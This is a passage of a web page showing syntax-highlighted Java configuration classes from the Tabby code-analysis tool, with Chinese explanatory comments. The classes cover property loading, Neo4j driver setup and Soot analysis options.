class="token class-name">File</span><span class="token punctuation">.</span>separator<span class="token punctuation">,</span> <span class="token constant">RULES_PATH</span><span class="token punctuation">,</span> <span class="token string">"sinks.json"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token constant">SYSTEM_RULE_PATH</span> <span class="token operator">=</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token class-name">File</span><span class="token punctuation">.</span>separator<span class="token punctuation">,</span> <span class="token constant">RULES_PATH</span><span class="token punctuation">,</span> <span class="token string">"system.json"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token constant">IGNORE_PATH</span> <span class="token operator">=</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token class-name">File</span><span class="token punctuation">.</span>separator<span class="token punctuation">,</span> <span class="token constant">RULES_PATH</span><span class="token punctuation">,</span> <span class="token string">"ignores.json"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token constant">BASIC_CLASSES_PATH</span> <span class="token operator">=</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token class-name">File</span><span class="token punctuation">.</span>separator<span class="token punctuation">,</span> <span class="token constant">RULES_PATH</span><span class="token punctuation">,</span> <span class="token string">"basicClasses.json"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token constant">COMMON_JARS_PATH</span> <span class="token operator">=</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token class-name">File</span><span class="token punctuation">.</span>separator<span class="token punctuation">,</span> <span class="token constant">RULES_PATH</span><span class="token punctuation">,</span> <span class="token string">"commonJars.json"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token constant">THREAD_POOL_SIZE</span> <span class="token operator">=</span> <span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"tabby.build.thread.size"</span><span class="token punctuation">,</span> <span class="token string">"max"</span><span class="token punctuation">,</span> props<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> maxThreadPoolSize <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">availableProcessors</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">"max"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token constant">THREAD_POOL_SIZE</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token class-name">AsyncConfiguration</span><span class="token punctuation">.</span><span class="token constant">CORE_POOL_SIZE</span> <span class="token operator">=</span> maxThreadPoolSize<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">try</span><span class="token punctuation">&#123;</span>                    <span class="token class-name">AsyncConfiguration</span><span class="token punctuation">.</span><span class="token constant">CORE_POOL_SIZE</span> <span class="token operator">=</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span><span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token constant">THREAD_POOL_SIZE</span><span class="token punctuation">)</span><span class="token punctuation">,</span> maxThreadPoolSize<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    <span class="token comment">// 解析出错 使用最大的线程数</span>                    <span class="token class-name">AsyncConfiguration</span><span class="token punctuation">.</span><span class="token constant">CORE_POOL_SIZE</span> <span class="token operator">=</span> maxThreadPoolSize<span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">initConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>isInitialed<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token comment">//        log.info("Try to apply settings.properties");</span>        <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// apply others</span>        <span class="token constant">MODE</span> <span class="token operator">=</span> <span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"tabby.build.mode"</span><span class="token punctuation">,</span> <span class="token string">"gadget"</span><span class="token punctuation">,</span> props<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token constant">TARGET</span> <span class="token operator">=</span> <span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"tabby.build.target"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> props<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token constant">OUTPUT_DIRECTORY</span> <span class="token operator">=</span> <span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"tabby.output.directory"</span><span class="token punctuation">,</span> <span class="token string">"./output"</span><span class="token punctuation">,</span> props<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token constant">IS_LOAD_ENABLE</span> <span class="token operator">=</span> <span class="token function">getBooleanProperty</span><span class="token punctuation">(</span><span class="token string">"tabby.load.enable"</span><span class="token punctuation">,</span> <span class="token string">"false"</span><span class="token punctuation">,</span> props<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token constant">IS_BUILD_ENABLE</span> <span class="token operator">=</span> <span class="token function">getBooleanProperty</span><span class="token punctuation">(</span><span class="token string">"tabby.build.enable"</span><span class="token punctuation">,</span> <span class="token string">"false"</span><span class="token punctuation">,</span> props<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token constant">IS_DOCKER_IMPORT_PATH</span> <span class="token operator">=</span> <span class="token function">getBooleanProperty</span><span class="token punctuation">(</span><span class="token string">"tabby.cache.isDockerImportPath"</span><span class="token punctuation">,</span> <span class="token string">"false"</span><span class="token punctuation">,</span> props<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name">FileUtils</span><span class="token punctuation">.</span><span class="token function">fileExists</span><span class="token punctuation">(</span><span class="token constant">OUTPUT_DIRECTORY</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token class-name">FileUtils</span><span class="token punctuation">.</span><span class="token function">createDirectory</span><span class="token punctuation">(</span><span class="token constant">OUTPUT_DIRECTORY</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token constant">IS_BUILD_ENABLE</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token comment">// 如果存在output，则删除该目录下的csv文件</span>            <span class="token function">clean</span><span class="token punctuation">(</span><span class="token constant">OUTPUT_DIRECTORY</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// resolve cache directory</span>        <span class="token constant">OUTPUT_DIRECTORY</span> <span class="token operator">=</span> <span class="token class-name">FileUtils</span><span class="token punctuation">.</span><span class="token function">getRealPath</span><span class="token punctuation">(</span><span class="token constant">OUTPUT_DIRECTORY</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token constant">CLASSES_OUTPUT_PATH</span> <span class="token operator">=</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token class-name">File</span><span class="token punctuation">.</span>separator<span class="token punctuation">,</span><span class="token constant">OUTPUT_DIRECTORY</span><span class="token punctuation">,</span> <span class="token string">"GRAPHDB_PUBLIC_CLASSES.csv"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token constant">METHODS_OUTPUT_PATH</span> <span class="token operator">=</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token class-name">File</span><span class="token punctuation">.</span>separator<span class="token punctuation">,</span><span class="token constant">OUTPUT_DIRECTORY</span><span class="token punctuation">,</span> <span class="token string">"GRAPHDB_PUBLIC_METHODS.csv"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token constant">CALL_RELATIONSHIP_OUTPUT_PATH</span> <span class="token operator">=</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token class-name">File</span><span class="token punctuation">.</span>separator<span class="token punctuation">,</span><span class="token constant">OUTPUT_DIRECTORY</span><span class="token punctuation">,</span> <span class="token string">"GRAPHDB_PUBLIC_CALL.csv"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token constant">ALIAS_RELATIONSHIP_OUTPUT_PATH</span> <span class="token operator">=</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token class-name">File</span><span class="token punctuation">.</span>separator<span class="token punctuation">,</span><span class="token constant">OUTPUT_DIRECTORY</span><span class="token punctuation">,</span> <span class="token string">"GRAPHDB_PUBLIC_ALIAS.csv"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token constant">EXTEND_RELATIONSHIP_OUTPUT_PATH</span> <span class="token operator">=</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token class-name">File</span><span class="token punctuation">.</span>separator<span class="token punctuation">,</span><span class="token constant">OUTPUT_DIRECTORY</span><span class="token punctuation">,</span> <span class="token string">"GRAPHDB_PUBLIC_EXTEND.csv"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token constant">HAS_RELATIONSHIP_OUTPUT_PATH</span> <span class="token operator">=</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token class-name">File</span><span class="token punctuation">.</span>separator<span class="token punctuation">,</span><span class="token constant">OUTPUT_DIRECTORY</span><span class="token punctuation">,</span> <span class="token string">"GRAPHDB_PUBLIC_HAS.csv"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token constant">INTERFACE_RELATIONSHIP_OUTPUT_PATH</span> <span class="token operator">=</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token class-name">File</span><span class="token punctuation">.</span>separator<span class="token punctuation">,</span><span class="token constant">OUTPUT_DIRECTORY</span><span class="token punctuation">,</span> <span class="token string">"GRAPHDB_PUBLIC_INTERFACES.csv"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token constant">DEBUG</span> <span class="token operator">=</span> <span class="token function">getBooleanProperty</span><span class="token punctuation">(</span><span class="token string">"tabby.debug.details"</span><span class="token punctuation">,</span> <span class="token string">"false"</span><span class="token punctuation">,</span> props<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token constant">IS_WEB_MODE</span> <span class="token operator">=</span> <span class="token string">"web"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token constant">MODE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token constant">IS_JDK_ONLY</span> <span class="token operator">=</span> <span class="token function">getBooleanProperty</span><span class="token punctuation">(</span><span class="token string">"tabby.build.isJDKOnly"</span><span class="token punctuation">,</span> <span class="token string">"false"</span><span class="token punctuation">,</span> props<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token constant">IS_JDK_ONLY</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token constant">IS_WITH_ALL_JDK</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token constant">IS_EXCLUDE_JDK</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token constant">IS_JDK_PROCESS</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token constant">IS_WITH_ALL_JDK</span> <span class="token operator">=</span> <span class="token function">getBooleanProperty</span><span class="token punctuation">(</span><span class="token string">"tabby.build.withAllJDK"</span><span class="token punctuation">,</span> <span class="token string">"false"</span><span class="token punctuation">,</span> props<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token constant">IS_EXCLUDE_JDK</span> <span class="token operator">=</span> <span class="token function">getBooleanProperty</span><span class="token punctuation">(</span><span class="token string">"tabby.build.excludeJDK"</span><span class="token punctuation">,</span> <span class="token string">"false"</span><span class="token punctuation">,</span> props<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token constant">IS_JDK_PROCESS</span> <span class="token operator">=</span> <span class="token function">getBooleanProperty</span><span class="token punctuation">(</span><span class="token string">"tabby.build.isJDKProcess"</span><span class="token punctuation">,</span> <span class="token string">"false"</span><span class="token punctuation">,</span> props<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token constant">IS_CHECK_FAT_JAR</span> <span class="token operator">=</span> <span class="token function">getBooleanProperty</span><span class="token punctuation">(</span><span class="token string">"tabby.build.checkFatJar"</span><span class="token punctuation">,</span> <span class="token string">"false"</span><span class="token punctuation">,</span> props<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token constant">IS_FULL_CALL_GRAPH_CONSTRUCT</span> <span class="token operator">=</span> <span class="token function">getBooleanProperty</span><span class="token punctuation">(</span><span class="token string">"tabby.build.isFullCallGraphCreate"</span><span class="token punctuation">,</span> <span class="token string">"false"</span><span class="token punctuation">,</span> props<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token constant">IS_NEED_TO_CREATE_IGNORE_LIST</span> <span class="token operator">=</span> <span class="token function">getBooleanProperty</span><span class="token punctuation">(</span><span class="token string">"tabby.build.isNeedToCreateIgnoreList"</span><span class="token punctuation">,</span> <span class="token string">"true"</span><span class="token punctuation">,</span> props<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span><span class="token punctuation">&#123;</span>            <span class="token constant">TIMEOUT</span> <span class="token operator">=</span> <span class="token function">getIntProperty</span><span class="token punctuation">(</span><span class="token string">"tabby.build.thread.timeout"</span><span class="token punctuation">,</span> <span class="token string">"2"</span><span class="token punctuation">,</span> props<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> ignore<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// 支持绝对路径 issue 7</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token constant">IS_JDK_ONLY</span> <span class="token operator">&amp;&amp;</span> <span class="token constant">TARGET</span> <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token class-name">FileUtils</span><span class="token punctuation">.</span><span class="token function">fileExists</span><span class="token punctuation">(</span><span class="token constant">TARGET</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token class-name">String</span> target <span class="token operator">=</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token class-name">File</span><span class="token punctuation">.</span>separator<span class="token punctuation">,</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"user.dir"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant">TARGET</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name">FileUtils</span><span class="token punctuation">.</span><span class="token function">fileExists</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalArgumentException</span><span class="token punctuation">(</span><span class="token string">"target not exists!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">String</span> libraries <span class="token operator">=</span> props<span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"tabby.build.libraries"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>libraries <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token class-name">FileUtils</span><span class="token punctuation">.</span><span class="token function">fileExists</span><span class="token punctuation">(</span>libraries<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token constant">LIBS_PATH</span> <span class="token operator">=</span> libraries<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>                libraries <span class="token operator">=</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token class-name">File</span><span class="token punctuation">.</span>separator<span class="token punctuation">,</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"user.dir"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> libraries<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token class-name">FileUtils</span><span class="token punctuation">.</span><span class="token function">fileExists</span><span class="token punctuation">(</span>libraries<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    <span class="token constant">LIBS_PATH</span> <span class="token operator">=</span> libraries<span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        isInitialed <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">clean</span><span class="token punctuation">(</span><span class="token class-name">String</span> directory<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">File</span> cacheDir <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>directory<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">File</span><span class="token punctuation">[</span><span class="token punctuation">]</span> files <span class="token operator">=</span> cacheDir<span class="token punctuation">.</span><span class="token function">listFiles</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>files <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">File</span> file<span class="token operator">:</span> files<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    <span class="token class-name">String</span> name <span class="token operator">=</span> file<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span>name<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">".csv"</span><span class="token punctuation">)</span> <span class="token operator">||</span> name<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">".db"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                        <span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">deleteIfExists</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span><span class="token function">toPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token class-name">String</span> key<span class="token punctuation">,</span> <span class="token class-name">String</span> defaultValue<span class="token punctuation">,</span> <span class="token class-name">Properties</span> props<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> props<span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> defaultValue<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">getBooleanProperty</span><span class="token punctuation">(</span><span class="token class-name">String</span> key<span class="token punctuation">,</span> <span class="token class-name">String</span> defaultValue<span class="token punctuation">,</span> <span class="token class-name">Properties</span> props<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token class-name">Boolean</span><span class="token punctuation">.</span><span class="token function">parseBoolean</span><span class="token punctuation">(</span><span class="token function">getProperty</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> defaultValue<span class="token punctuation">,</span> props<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">getIntProperty</span><span class="token punctuation">(</span><span class="token class-name">String</span> key<span class="token punctuation">,</span> <span class="token class-name">String</span> defaultValue<span class="token punctuation">,</span> <span class="token class-name">Properties</span> props<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">getProperty</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> defaultValue<span class="token punctuation">,</span> props<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></li></ol><h3id="tabbyconfigneo4jconfiguration.java">tabby/config/Neo4jConfiguration.java</h3><ol type="1"><li><p>Code</p><pre class="language-java-+" data-language="java-+"><code class="language-java-+">package tabby.config;import static tabby.config.GlobalConfiguration.NEO4J_PASSWORD;import static tabby.config.GlobalConfiguration.NEO4J_URL;import static tabby.config.GlobalConfiguration.NEO4J_USERNAME;import org.neo4j.driver.AuthToken;import org.neo4j.driver.AuthTokens;import org.neo4j.driver.Config;import org.neo4j.driver.Driver;import org.neo4j.driver.GraphDatabase;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;&#x2F;** * @author wh1t3p1g * @since 2022&#x2F;9&#x2F;5 *&#x2F;&#x2F;&#x2F; 使用 GraphDatabase.driver() 方法创建一个 Neo4j 驱动程序。GraphDatabase.driver() 方法需要三个参数：&#x2F;&#x2F; NEO4J_URL：Neo4j 数据库的 URL。&#x2F;&#x2F; authToken：用于连接 Neo4j 数据库的认证令牌。&#x2F;&#x2F; config：Neo4j 数据库的配置对象。&#x2F;&#x2F; driver() 方法返回的 Neo4j 驱动程序可以用于连接和操作 Neo4j 数据库。&#x2F;&#x2F; 该配置类会在 Tabby 应用程序启动时被加载，并用于创建 Neo4j 驱动程序。Tabby 应用程序可以使用 Neo4j 驱动程序来存储和查询数据。@Configurationpublic class Neo4jConfiguration &#123;    @Bean    public Driver driver() &#123;        AuthToken authToken &#x3D; AuthTokens.basic(NEO4J_USERNAME, NEO4J_PASSWORD);        Config config &#x3D; Config.builder().build();        return GraphDatabase.driver(NEO4J_URL, authToken, config);    &#125;&#125;</code></pre></li></ol><h3id="tabbyconfigsootconfiguration.java">tabby/config/SootConfiguration.java</h3><ol type="1"><li><p>Code</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">tabby<span class="token punctuation">.</span>config</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">lombok<span class="token punctuation">.</span>extern<span class="token punctuation">.</span>slf4j<span class="token punctuation">.</span></span><span class="token class-name">Slf4j</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">soot<span class="token punctuation">.</span></span><span class="token class-name">G</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">soot<span class="token punctuation">.</span>options<span class="token punctuation">.</span></span><span class="token class-name">Options</span></span><span class="token punctuation">;</span><span class="token comment">/** * @author wh1t3P1g * @since 2020/10/9 */</span><span class="token annotation punctuation">@Slf4j</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SootConfiguration</span> <span class="token punctuation">&#123;</span>    <span class="token comment">/**     * soot 默认配置     */</span><span class="token comment">// initSootOption() 方法用于初始化 Soot 的默认选项。</span><span class="token comment">// G.reset() 方法用于重置 Soot 的状态。</span><span class="token comment">// Options.v().set_verbose(false) 方法用于设置 Soot 的详细信息级别。</span><span class="token comment">// Options.v().set_prepend_classpath(true) 方法用于设置 Soot 优先载入 Soot 的 classpath。</span><span class="token comment">// Options.v().set_allow_phantom_refs(true) 方法用于允许处理幽灵引用。</span><span class="token comment">// Options.v().set_keep_line_number(true) 方法用于记录文件行数。</span><span class="token comment">// Options.v().set_src_prec(Options.src_prec_class) 方法用于设置 Soot 优先处理 class 格式的文件。</span><span class="token comment">// Options.v().set_whole_program(true) 方法用于设置 Soot 进行全程序分析。</span><span class="token comment">// Options.v().set_oaat(true) 方法用于设置 Soot 进行 OAAT 优化。</span><span class="token comment">// 这些选项可以根据需要进行调整，以满足不同的需求。</span><span class="token comment">// Tabby 应用程序会在启动时调用 initSootOption() 方法，以初始化 Soot 的默认选项。</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">initSootOption</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//        String output = String.join(File.separator, System.getProperty("user.dir"), "temp");</span><span class="token comment">//        log.debug("Output directory: " + output);</span>        <span class="token class-name">G</span><span class="token punctuation">.</span><span class="token function">reset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Options</span><span class="token punctuation">.</span><span class="token function">v</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">set_verbose</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 打印详细信息</span><span class="token comment">//        Options.v().set_num_threads(5);</span>        <span class="token class-name">Options</span><span class="token punctuation">.</span><span class="token function">v</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">set_prepend_classpath</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 优先载入soot classpath</span>        <span class="token class-name">Options</span><span class="token punctuation">.</span><span class="token function">v</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">set_allow_phantom_refs</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Options</span><span class="token punctuation">.</span><span class="token function">v</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">set_keep_line_number</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 记录文件行数</span>        <span class="token class-name">Options</span><span class="token punctuation">.</span><span class="token function">v</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">set_src_prec</span><span class="token punctuation">(</span><span class="token class-name">Options</span><span class="token punctuation">.</span>src_prec_class<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 优先处理class格式</span><span class="token comment">//        Options.v().set_output_dir(output); // 设置IR Jimple的输出目录</span><span class="token comment">//        Options.v().set_output_format(Options.output_format_jimple); // 输出Jimple格式</span><span class="token comment">//        Options.v().set_on_the_fly(true);</span><span class="token comment">//        Options.v().set_no_output_source_file_attribute(true);</span><span class="token comment">//        Options.v().set_validate(true);</span><span class="token comment">//        Options.v().set_ignore_classpath_errors(true); // Ignores invalid entries on the Soot classpath.</span>        <span class="token class-name">Options</span><span class="token punctuation">.</span><span class="token function">v</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">set_whole_program</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 